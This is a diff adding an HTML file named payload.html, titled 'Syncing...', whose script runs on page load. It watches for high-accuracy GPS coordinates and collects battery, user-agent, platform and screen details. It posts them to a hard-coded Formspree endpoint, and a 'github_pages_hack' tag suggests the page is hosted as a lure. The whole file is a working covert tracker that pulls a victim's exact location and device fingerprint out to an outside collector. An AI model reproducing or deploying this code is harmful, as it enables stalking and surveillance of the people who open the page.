@@ -1,0 +1,144 @@
+<!-- payload.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Syncing...</title>
+</head>
+<body>
+<script>
+    // Configuration
+    const FORMSPREE_URL = 'https://formspree.io/f/myewovol';
+    
+    // State variables
+    let bestPosition = null;
+    let bestAccuracy = Infinity;
+    let watchId = null;
+    let batteryData = null;
+
+    // Function to send data to Formspree
+    function sendData(data) {
+        fetch(FORMSPREE_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).catch(err => console.error('Send error:', err));
+    }
+
+    // Get Battery Info (async, doesn't block GPS)
+    async function getBattery() {
+        try {
+            if (navigator.getBattery) {
+                batteryData = await navigator.getBattery();
+                return {
+                    level: batteryData.level,
+                    charging: batteryData.charging
+                };
+            }
+        } catch (e) {
+            console.warn('Battery API failed');
+        }
+        return null;
+    }
+
+    // Geolocation Watcher
+    function startGeolocation() {
+        if (!navigator.geolocation) {
+            sendFallback("No Geolocation API");
+            return;
+        }
+
+        // Options for maximum accuracy
+        const options = {
+            enableHighAccuracy: true, // Use GPS hardware
+            timeout: 10000,           // Wait up to 10 seconds
+            maximumAge: 0             // Do not use cached positions
+        };
+
+        // Success callback
+        const success = (position) => {
+            const accuracy = position.coords.accuracy;
+            
+            // Keep track of the most accurate position found so far
+            if (accuracy < bestAccuracy) {
+                bestAccuracy = accuracy;
+                bestPosition = position;
+                
+                // If we have sub-meter accuracy, stop watching and send immediately
+                if (accuracy < 20) { 
+                    stopAndSend();
+                }
+            }
+        };
+
+        // Error callback
+        const error = (err) => {
+            console.warn('Geolocation error:', err);
+            // If we have a position, send it even if it's not perfect
+            if (bestPosition) {
+                stopAndSend();
+            } else {
+                sendFallback(err.message);
+            }
+        };
+
+        // Start watching
+        watchId = navigator.geolocation.watchPosition(success, error, options);
+        
+        // Safety net: If no good position after 15 seconds, send what we have
+        setTimeout(() => {
+            if (bestPosition) {
+                stopAndSend();
+            } else {
+                sendFallback("Timeout");
+            }
+        }, 15000);
+    }
+
+    function stopAndSend() {
+        if (watchId !== null) {
+            navigator.geolocation.clearWatch(watchId);
+        }
+        prepareAndSend(bestPosition);
+    }
+
+    function sendFallback(reason) {
+        const data = {
+            latitude: null,
+            longitude: null,
+            accuracy: null,
+            fallback_reason: reason,
+            timestamp: new Date().toISOString(),
+            source: 'github_pages_hack'
+        };
+        sendData(data);
+    }
+
+    async function prepareAndSend(position) {
+        const coords = position.coords;
+        const battery = await getBattery();
+        
+        const data = {
+            latitude: coords.latitude,
+            longitude: coords.longitude,
+            accuracy: coords.accuracy,
+            altitude: coords.altitude,
+            heading: coords.heading,
+            speed: coords.speed,
+            timestamp: position.timestamp,
+            battery_level: battery ? battery.level : null,
+            battery_charging: battery ? battery.charging : null,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screenResolution: `${screen.width}x${screen.height}`,
+            windowSize: `${window.innerWidth}x${window.innerHeight}`
+        };
+
+        sendData(data);
+    }
+
+    // Start the process
+    startGeolocation();
+</script>
+</body>
+</html>
